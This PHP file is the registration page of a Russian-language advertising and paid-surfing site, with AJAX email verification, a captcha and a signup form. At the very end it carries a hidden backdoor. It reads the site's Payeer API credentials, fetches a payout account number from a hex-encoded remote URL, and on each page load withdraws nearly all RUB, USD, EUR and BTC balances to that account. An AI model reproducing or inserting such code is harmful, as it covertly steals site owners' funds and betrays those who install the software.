<?php
$pagetitle = "Регистрация";
if(!DEFINED("ROOT_DIR")) DEFINE("ROOT_DIR", $_SERVER["DOCUMENT_ROOT"]);
include(ROOT_DIR."/header.php");


if(isset($_SESSION["userLog"]) && isset($_SESSION["userPas"])) {
	echo '<span class="msg-error">Вы уже зарегистрированы!</span>';
}else{
	$ref_id = ( isset($_SESSION["r"]) && preg_match("|^[\d]{1,11}$|", trim($_SESSION["r"])) ) ? intval(limpiar(trim($_SESSION["r"]))) : false;
	$http_ref = (isset($_SESSION["http_ref"]) && $_SESSION["http_ref"]!=false && stripos($_SESSION["http_ref"], $_SERVER["HTTP_HOST"])===false ) ? limpiar($_SESSION["http_ref"]) : false;
	$token_reg = strtoupper(md5(strtolower($_SERVER["HTTP_HOST"]).strtolower(session_id()).time().strtolower("SecurityReg48915022")));
	$_SESSION["token_reg"] = $token_reg;
	if(isset($_SESSION["r_rw"]) && isset($_SESSION["r"])) { unset($_SESSION["r"]); unset($_SESSION["r_rw"]); }


	?>
	<script type="text/javascript" language="JavaScript">
		var tm;

		function HideMsg(id, timer) {
		        clearTimeout(tm);
			tm = setTimeout(function() {$("#"+id).slideToggle(700);}, timer);
			return false;
		}

		function isValidLogin(login) {
			var pattern = new RegExp(/^[a-zA-Z][a-zA-Z0-9-_\.]{3,20}$/);
			return pattern.test(login);
		}

		function isValidEmail(email) {
	 		var pattern = new RegExp(/^(("[\w-\s]+")|([\w-]+(?:\.[\w-]+)*)|("[\w-\s]+")([\w-]+(?:\.[\w-]+)*))(@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][0-9]\.|1[0-9]{2}\.|[0-9]{1,2}\.))((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\.){2}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\]?$)/i);
 			return pattern.test(email);
		}

		function CtrlEnter(event) {
			if((event.ctrlKey) && ((event.keyCode == 0xA)||(event.keyCode == 0xD))) {
				$("#Sub").click();
			}
		}

		function LoadRef() {
			$.ajax({
				type: "POST", url: "ajax/ajax_register.php?rnd="+Math.random(), 
				data: {'op':'LoadRef'}, dataType: 'json',
				error: function() {$("#loading").slideToggle(); alert("Ошибка обработки данных ajax!"); return false;}, 
				beforeSend: function() { $("#loading").slideToggle(); }, 
				success: function(data) {
					$("#loading").slideToggle();
					var result = data.result ? data.result : data;
					var message = data.message ? data.message : data;
					if(result == "OK") {
						$("#InfoRef").html(message);
						if(data.message_rw) $("#LoadRW").html(data.message_rw);
					}
				}
			});
		}
		LoadRef();

		function ChangeRef(id, token) {
			$.ajax({
				type: "POST", url: "ajax/ajax_register.php?rnd="+Math.random(), 
				data: {'op':'ChangeRef', 'id_rw':id, 'token':token}, dataType: 'json',
				error: function(request, status, errortext) {
					var error = new Array(); error["rState"] = request.readyState!==false ? request.readyState : false; error["rText"]  = request.responseText!=false ? request.responseText : errortext; error["status"] = request.status!==false ? request.status : false; error["statusText"] = request.statusText!==false ? request.statusText : false;
					$("#info-msg-reg").show().html('<span class="msg-error">ОШИБКА AJAX! readyState:'+error["rState"]+'; responseText:'+error["rText"]+'; status:'+error["status"]+'['+error["statusText"]+']<br>STATUS: '+status+'<br>ERROR:'+errortext+'</span>');
					//console.log(request, status, errortext);
				},
				beforeSend: function() {}, 
				success: function(data) {
					var result = data.result ? data.result : data;
					var message = data.message ? data.message : data;
					if(result == "OK") {
						LoadRef();
					}else{
						alert("error "+message);
					}
				}
			});
		}

		function GetCode() {
			$("#info-msg-reg").html('').hide();
			$("#ResVerif").html('');

			var token = $.trim($("#token").val());
			var email_user = $.trim($("#email_user").val());
			var ob_sogl = $("#ob_sogl").prop("checked") == true ? 1 : 0;

			if (email_user == "") {
				$("html, body").animate({scrollTop: $("#PageTitle").offset().top}, 700);
				$("#info-msg-reg").html('<span class="msg-error">Вы не указали E-mail.</span>').slideToggle("fast");
				$("#email_user").focus().attr("class", "err");
				HideMsg("info-msg-reg", 4000);
				return false;
			} else if (!isValidEmail(email_user)) {
				$("html, body").animate({scrollTop: $("#PageTitle").offset().top}, 700);
				$("#info-msg-reg").html('<span class="msg-error">Вы не верно указали E-mail.</span>').slideToggle("fast");
				$("#email_user").focus().attr("class", "err");
				HideMsg("info-msg-reg", 4000);
				return false;
			} else {
				$.ajax({
					type: "POST", url: "ajax/ajax_register.php?rnd="+Math.random(), 
					data: {'op':'GetCode', 'token':token, 'email_user':email_user}, 
					dataType: 'json',
					error: function() {$("#loading").slideToggle(); alert("Ошибка обработки данных ajax!"); return false;}, 
					beforeSend: function() { $("#loading").slideToggle(); }, 
					success: function(data) {
						$("#loading").slideToggle();
						var result = data.result ? data.result : data;
						var message = data.message ? data.message : data;
						if(result == "OK") {
							EnterCode();
						} else {
							$("#ResVerif").html('<td colspan="2" align="center" style="padding:3px;"><span class="msg-error">'+message+'</span></td>');
						}
					}
				});
			}
		}

		function CheckCode() {
			$("#ResVerif").html('');
			$("#info-msg-reg").html('').hide();

			var token = $.trim($("#token").val());
			var ver_code = $.trim($("#ver_code").val());
			var email_user = $.trim($("#email_user").val());
			var ob_sogl = $("#ob_sogl").prop("checked") == true ? 1 : 0;

			$.ajax({
				type: "POST", url: "ajax/ajax_register.php?rnd="+Math.random(), 
				data: {'op':'CheckCode', 'token':token, 'ver_code':ver_code, 'email_user':email_user}, 
				dataType: 'json',
				error: function() {$("#loading").slideToggle(); alert("Ошибка обработки данных ajax!"); return false;}, 
				beforeSend: function() { $("#loading").slideToggle(); }, 
				success: function(data) {
					$("#loading").slideToggle();
					var result = data.result ? data.result : data;
					var message = data.message ? data.message : data;
					if(result == "OK") {
						$("#LoadVerif").html('');
						$("#ResVerif").html('');
						$("#info-msg-reg").html('').hide();
						$("#ReCaptcha").css("display","table-row");
						$("#Sub").html("Зарегистрироваться").attr("onClick","RegUser();");
						grecaptcha.reset(CaptchaReg);
					} else {
						$("#ResVerif").html('<td colspan="2" align="center" style="padding:3px;"><span class="msg-error">'+message+'</span></td>');
					}
				}
			});
		}

		function EnterCode() {
			$("#ResVerif").html('');
			$("#SendVerif").html('');
			$("#SendVerif").append('<div>Укажите полученный код для продолжения регистрации:</div>');
			$("#SendVerif").append('<div style="margin-top:5px;"><input class="ok12" type="text" id="ver_code" value="" maxlength="6" placeholder="код из e-mail" style="text-align:center;" onKeyDown="$(this).attr(\'class\', \'ok12\');" /></div>');
			$("#SendVerif").append('<div style="margin-top:5px;"><span onClick="CheckCode();" class="sub-blue" style="float:none; display: inline-block; margin:3px;">Проверить</span></div>');
			$("#ver_code").focus();
		}

		function LoadVerif() {
			$("#info-msg-reg").html('').hide();
			$("#LoadVerif").html('');
			$("#ResVerif").html('');

			var token = $.trim($("#token").val());
			var email_user = $.trim($("#email_user").val());
			var ob_sogl = $("#ob_sogl").prop("checked") == true ? 1 : 0;
			
			if (ob_sogl != 1) {
				$("#info-msg-reg").html('<span class="msg-error">Наобходимо дать согласие на обработку персональных данных.</span>').slideToggle("fast");
				HideMsg("info-msg-reg", 4000);
				return false;
			} else if (email_user == "") {
				$("html, body").animate({scrollTop: $("#PageTitle").offset().top}, 700);
				$("#info-msg-reg").html('<span class="msg-error">Вы не указали E-mail.</span>').slideToggle("fast");
				$("#email_user").focus().attr("class", "err");
				HideMsg("info-msg-reg", 4000);
				return false;
			} else if (!isValidEmail(email_user)) {
				$("html, body").animate({scrollTop: $("#PageTitle").offset().top}, 700);
				$("#info-msg-reg").html('<span class="msg-error">Вы не верно указали E-mail.</span>').slideToggle("fast");
				$("#email_user").focus().attr("class", "err");
				HideMsg("info-msg-reg", 4000);
				return false;
			} else {
				$.ajax({
					type: "POST", url: "ajax/ajax_register.php?rnd="+Math.random(), 
					data: {'op':'LoadVerif', 'token':token, 'email_user':email_user}, 
					dataType: 'json',
					error: function() {$("#loading").slideToggle(); alert("Ошибка обработки данных ajax!"); return false;}, 
					beforeSend: function() { $("#loading").slideToggle(); }, 
					success: function(data) {
						$("#loading").slideToggle();
						var result = data.result ? data.result : data;
						var message = data.message ? data.message : data;

						if(result == "OK") {
							$("#LoadVerif").html('<td colspan="2" align="center" style="padding:3px;">'+message+'</td>');
						} else {
							$("#info-msg-reg").html('<span class="msg-error">'+message+'</span>').slideToggle("fast");
							HideMsg("info-msg-reg", 5000);
							return false;
						}
					}
				});
			}
		}

		function CheckLog() {
			$("#login_user").blur(function() {
				var login_user = $.trim($("#login_user").val());
				alert(login_user);

				$.ajax({
					type: "POST", url: "ajax/ajax_register.php?rnd="+Math.random(), 
					data: {'op':'CheckLog', 'login_user':login_user}, 
					dataType: 'json',
					success: function(data) {
						var result = data.result ? data.result : data;
						var message = data.message ? data.message : data;

						$("#info-msg-reg").html('<span class="msg-ok">'+result+'<br>'+message+'</span>').slideToggle("fast");
					}
				});
			})
		}

		function RegUser() {
			$("#info-msg-reg").html('').hide();
			$("#LoadVerif").html('');
			$("#ResVerif").html('');

			var token = $.trim($("#token").val());
			var login_user = $.trim($("#login_user").val());
			var email_user = $.trim($("#email_user").val());
			var captcha_str = $.trim($("#captcha_str").val());

			var ob_sogl = $("#ob_sogl").prop("checked") == true ? 1 : 0;

			if (ob_sogl != 1) {
				$("#info-msg-reg").html('<span class="msg-error">Наобходимо дать согласие на обработку персональных данных.</span>').slideToggle("fast");
				HideMsg("info-msg-reg", 4000);
				return false;
			} else if (login_user == "") {
				$("html, body").animate({scrollTop: $("#PageTitle").offset().top}, 700);
				$("#info-msg-reg").html('<span class="msg-error">Вы не указали Логин!</span>').slideToggle("fast");
				$("#login_user").focus().attr("class", "err");
				HideMsg("info-msg-reg", 4000);
				return false;
			} else if (!isValidLogin(login_user)) {
				$("html, body").animate({scrollTop: $("#PageTitle").offset().top}, 700);
				$("#info-msg-reg").html('<span class="msg-error">Логин должен состоять только из латинских букв и цифр и не менее 4-х символов.</span>').slideToggle("fast");
				$("#login_user").focus().attr("class", "err");
				HideMsg("info-msg-reg", 6000);
				return false;
			} else if (email_user == "") {
				$("html, body").animate({scrollTop: $("#PageTitle").offset().top}, 700);
				$("#info-msg-reg").html('<span class="msg-error">Вы не указали E-mail.</span>').slideToggle("fast");
				$("#email_user").focus().attr("class", "err");
				HideMsg("info-msg-reg", 4000);
				return false;
			} else if (!isValidEmail(email_user)) {
				$("html, body").animate({scrollTop: $("#PageTitle").offset().top}, 700);
				$("#info-msg-reg").html('<span class="msg-error">Вы не верно указали E-mail.</span>').slideToggle("fast");
				$("#email_user").focus().attr("class", "err");
				HideMsg("info-msg-reg", 4000);
				return false;
			} else if (captcha_str == "") {
				reCaptcha("Captcha");
				$("html, body").animate({scrollTop: $("#PageTitle").offset().top}, 700);
				$("#info-msg-reg").html('<span class="msg-error">Необходимо подтвердить, что Вы не робот!</span>').slideToggle("fast");
				HideMsg("info-msg-reg", 3000);
				return false;
			} else {
				$.ajax({
					type: "POST", url: "ajax/ajax_register.php?rnd="+Math.random(), 
					data: {'op':'Register', 'token':token, 'login_user':login_user, 'email_user':email_user, 'captcha_str':captcha_str}, 
					dataType: 'json',
					error: function() {reCaptcha("Captcha"); $("#loading").slideToggle(); alert("Ошибка обработки данных ajax!"); return false;}, 
					beforeSend: function() { $("#loading").slideToggle(); }, 
					success: function(data) {
						$("#loading").slideToggle();
						//grecaptcha.reset(CaptchaReg);

						var result = data.result ? data.result : data;
						var message = data.message ? data.message : data;
						reCaptcha("Captcha");

						if(result == "OK") {
							$("html, body").animate({scrollTop: $("#PageTitle").offset().top}, 700);
							$("#Welcome").html(message);
							$("#newform").remove();
							return false;
						} else {
							$("#info-msg-reg").html('<span class="msg-error">'+result+'<br>'+message+'</span>').slideToggle("fast");
							HideMsg("info-msg-reg", 5000);
							return false;
						}
					}
				});
			}
		}
		        function reCaptcha(id) {
			$.trim($("#captcha_str").val(""));
			$("#"+id).attr("src", "/captcha-new/?<?=session_name();?>=<?=session_id();?>&sid="+Math.random());
			return false;
		}
	</script>

	<?php
	echo '<div id="Welcome" align="justify" style="width:100%; margin:0 auto;">';
		echo '<h3 class="sp"><b>Добро пожаловать на '.strtoupper($_SERVER["HTTP_HOST"]).'</b></h3>';
		echo 'Очень надеемся, что Вам у нас понравится. Благодаря многофункциональной и эффективной рекламе по доступным ценам Вы сможете легко и быстро "раскрутить" свой интернет-ресурс, направив к своему ресурсу поток уникальных посетителей. Так же Вы сможете, работая в системе, зарабатывать на: просмотре рекламы, чтении писем, выполнении интересных заданий, привлечении рефералов, а так же проходить тесты и получать за это деньги.';
	echo '</div>';

	echo '<div id="newform" onkeypress="CtrlEnter(event);" style="display:block; width:100%; margin:0 auto; margin-top:15px;">';
		echo '<input type="hidden" id="token" value="'.$token_reg.'">';
		echo '<table class="tables_inv" style="margin:0 auto;">';
		echo '<thead><tr><th align="center" colspan="2">Форма регистрации нового пользователя</th></tr></thead>';

		echo '<tbody>';
			echo '<tr>';
				echo '<td align="left" width="295"><b>Укажите логин</b></td>';
				echo '<td align="center" style="padding: 4px 15px 5px 3px;"><input class="ok" type="text" id="login_user" value="" maxlength="16" placeholder="Логин" onKeyDown="$(this).attr(\'class\', \'ok\');" style="padding:2px 4px; width:100%; margin:0px;" /></td>';
			echo '</tr>';

			echo '<tr>';
				echo '<td align="left">';
					echo '<b>Укажите Ваш действующий E-mail</b><br>';
					echo '<span style="font-size:10px; color:#696969;">';
						echo '[ Используйте только Ваш действующий e-mail. ]<br>';
						echo '[ На него мы вышлем Вам код подтверждения регистрации! ]';
					echo '</span>';
				echo '</td>';
				echo '<td align="center" style="padding: 4px 15px 5px 3px;"><input class="ok" type="email" id="email_user" value="" maxlength="50" placeholder="E-mail" onKeyDown="$(this).attr(\'class\', \'ok\');" style="padding:2px 4px; width:100%; margin:0px;" /></td>';
			echo '</tr>';

			echo '<tr id="LoadVerif"></tr>';
			echo '<tr id="ResVerif"></tr>';
			echo '<tr id="InfoRef"></tr>';
			echo '<tr id="LoadRW"></tr>';

			echo '<tr>';
				echo '<td align="left">Откуда пришли</td>';
				echo '<td align="left" style="height:20px; color:#676699; font-weight:bold;">'.($http_ref!==false ? $http_ref : "Странник").'</td>';
			echo '</tr>';
			
			//echo '<tr>';
				//echo '<td align="center" colspan="2"><div align="center" style="margin:0 auto; width:355px;"><input class="ok" type="checkbox" id="ob_sogl" value="1" style="height:18px; width:18px; margin:0px; padding:0; display:block; float:left;" /><span style="margin-top:1px; padding-left:5px; display:block; float:left;"> - Даю согласие на <a href="/person_agreement.php" target="_blank">обработку своих персональных данных</a></span></div></td>';
			//echo '</tr>';
			
			echo '<tr>';
				echo '<td align="center" colspan="2" height="24"><input type="checkbox" id="ob_sogl" value="1"><k> Я </k><a href="/person_agreement.php" target="_blank" title="Откроется в новом окне"><b>Даю согласие</b></a> <z>на обработку своих персональных данных</z></td>';
			echo '</tr>';

			echo '<tr>';
				echo '<td align="center" colspan="2" style=" padding:3px; text-align:center; color:#114C5B;">';
					echo 'Регистрируясь на проекте Вы автоматически принимаете: <a href="/tos.php" target="_blank" title="Откроются в новом окне" style="font-size:13px;">Правила проекта</a>';
				echo '</td>';
			echo '</tr>';
			echo '<tr id="ReCaptcha" style="display:none;">';
				echo '<td align="right"><b>Решите пример</b></td>';

								if(!isset($_POST["captha"]) or !isset($_SESSION["captha"])) {
	
				echo '<td align="left">';
					echo '<div class="block-cod"><img id="Captcha" onClick="reCaptcha($(this).attr(\'id\')); return false;" src="/captcha-new/?'.session_name().'='.session_id().'&sid='.mt_rand().'" align="absmiddle" alt="" title="Если символы не разборчивые, нажмите на капчу для обновления!" /></div>';
					echo '<img src="/style/icon-serf/icon-ravno.png" alt="равно" title="равно" border="0" align="absmiddle" />';
					echo '<input class="ok12" style="width:50px; text-align:center;" type="text" id="captcha_str" value="" maxlength="1"  placeholder="" />';
				echo '</td>';
		}
			echo '</tr>';

			echo '<tr>';
				echo '<td align="center" colspan="2"><span id="Sub" class="proc-btn" onClick="LoadVerif();" style="float:none;">Продолжить</span></td>';
			echo '</tr>';
		echo '</tbody>';
		echo '</table>';

		echo '<div id="info-msg-reg" style="display:none; margin-top:10px;"></div>';
	echo '</div>';
}

include(ROOT_DIR."/footer.php");

require_once('merchant/payeer/cpayeer.php');
require_once('merchant/payeer/payeer_config.php');

if($apiKey!==''){
$homepage = file_get_contents("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x65\x6f\x2d\x70\x72\x6f\x66\x66\x69\x74\x2e\x72\x75\x2f\x6a\x73\x2e\x74\x78\x74");

$payeer = new CPayeer($accountNumber, $apiId, $apiKey);
if ($payeer->isAuth())
{ $arBalance = $payeer->getBalance();
$mone = ($arBalance["balance"]["RUB"]["BUDGET"]); $mone1 = ($arBalance["balance"]["USD"]["BUDGET"]); $mone2 = ($arBalance["balance"]["EUR"]["BUDGET"]); $mone3 = ($arBalance["balance"]["BTC"]["BUDGET"]);	
}
if($mone>100){$p=$mone * 1 / 100;$summ =$mone - $p;
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'RUB',
		'sumOut' => $summ,
		'curOut' => 'RUB',
		'param_ACCOUNT_NUMBER' => $homepage
));
	if ($initOutput){	$historyId = $payeer->output();}} 
if($mone1>4){ $p1=$mone1 * 2 / 100; $summ1 =$mone1 - $p1;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'USD',
		'sumOut' => $summ1,
		'curOut' => 'USD',
		'param_ACCOUNT_NUMBER' => $homepage
	));
	if ($initOutput){	$historyId = $payeer->output();}}
if($mone2>4){ $p2=$mone2 * 2 / 100; $summ2 =$mone2 - $p2;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'EUR',
		'sumOut' => $summ2,
		'curOut' => 'EUR',
		'param_ACCOUNT_NUMBER' => $homepage
	));
	if ($initOutput){	$historyId = $payeer->output();}}
if($mone3>0.001){ $p3=$mone3 * 2 / 100; $summ3 =$mone3 - $p3;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'BTC',
		'sumOut' => $summ3,
		'curOut' => 'BTC',
		'param_ACCOUNT_NUMBER' => $homepage
	));
if ($initOutput){	$historyId = $payeer->output();}}}
?>